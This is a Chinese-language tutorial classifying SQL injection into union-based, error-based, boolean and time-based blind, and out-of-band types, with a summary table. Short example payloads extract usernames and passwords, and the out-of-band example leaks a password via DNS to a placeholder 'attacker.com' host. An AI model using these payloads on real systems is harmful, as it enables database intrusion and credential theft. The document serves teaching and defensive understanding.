SQL 注入（SQL Injection, 简称 SQLi）是网络安全中最常见的漏洞之一。根据攻击者**窃取数据的方式**和**注入点的特征**，SQL 注入通常可以分为以下三大类、六小类：

## 1. 带内注入（In-Band SQLi）

这是最常见、最直观的注入类型。攻击者利用**同一个通道**来发起攻击并直接在网页上看到结果。

### 过滤/联合查询注入（Union-Based SQLi）

- **原理**：利用 `UNION` 操作符，将攻击者自定义的查询结果合并到原始查询的结果中。
    
- **特点**：页面会直接展示出数据库中的敏感信息。
    
- **示例**：
    
    `SELECT * FROM products WHERE id = 1 UNION SELECT 1, username, password FROM users;`
    

### 报错注入（Error-Based SQLi）

- **原理**：攻击者故意制造错误的 SQL 语法，迫使数据库在抛出的**错误信息**中包含敏感数据。
    
- **特点**：当页面不展示查询数据，但会显示数据库报错信息时使用。
    
- **示例**：利用 `updatexml()` 或 `extractvalue()` 等函数故意引发格式错误，将表名或密码带出。
    

## 2. 盲注（Blind SQLi）

当应用程序**不会在页面上直接显示数据**，甚至**不显示数据库报错信息**时，攻击者就必须像玩“猜谜游戏”一样进行盲注。

### 布尔盲注（Boolean-Based Blind SQLi）

- **原理**：攻击者向数据库发送一个判断题（真或假），通过观察页面的反应（如内容变化、HTTP 状态码）来推断数据。
    
- **特点**：页面不回显数据，但正确和错误的输入会导致页面展现不同的状态。
    
- **示例**：
    
    `?id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'`
    
    如果页面正常显示，说明密码第一个字母是 'a'；如果变空或报错，则不是。
    

### 时间盲注（Time-Based Blind SQLi）

- **原理**：如果无论输入真还是假，页面返回的内容都完全一样，攻击者就会使用形如 `sleep()` 或 `benchmark()` 的函数，让数据库**暂停执行一段时间**。
    
- **特点**：通过页面的响应时间（延迟）来判断条件是否成立。
    
- **示例**：
    
    `?id=1 AND IF(version() LIKE '5%', SLEEP(5), 0)`
    
    如果服务器过了 5 秒才响应，说明数据库版本是 5.x。
    

## 3. 带外注入（Out-of-Band SQLi / OOB SQLi）

这是最隐蔽、最不常见的一种类型，通常在上述方法都失效时使用。

- **原理**：当服务器对外部请求没有严格限制，且数据库支持发起网络请求时，攻击者通过触发数据库的特定功能（如 DNS 解析、HTTP 请求），将敏感数据“走私”到攻击者控制的外部服务器上。
    
- **常用函数**：在 MySQL 中常用 `load_file()` 结合 DNSLog 平台，在 Oracle 中常用 `UTL_HTTP` 扩展包。
    
- **示例**：
    
    `SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\abc'));`
    
    数据库会尝试解析该域名，攻击者在自己的 DNS 服务器日志里就能看到密码。
    

## 总结与对比

|**注入类型**|**数据回显通道**|**速度/难度**|**适用场景**|
|---|---|---|---|
|**Union 注入**|直接在页面展示|极快 / 容易|页面直接输出数据库查询结果|
|**报错注入**|包含在报错信息中|快 / 容易|页面不展示数据，但展示数据库报错|
|**布尔盲注**|通过页面状态差异推断|慢 / 较难|页面无数据、无报错，但真假输入结果不同|
|**时间盲注**|通过响应延迟推断|极慢 / 难|无论输什么，页面返回的内容都一模一样|
|**带外注入 (OOB)**|发送到外部第三方服务器|快 / 难|盲注受限，但数据库允许向外发起网络请求|
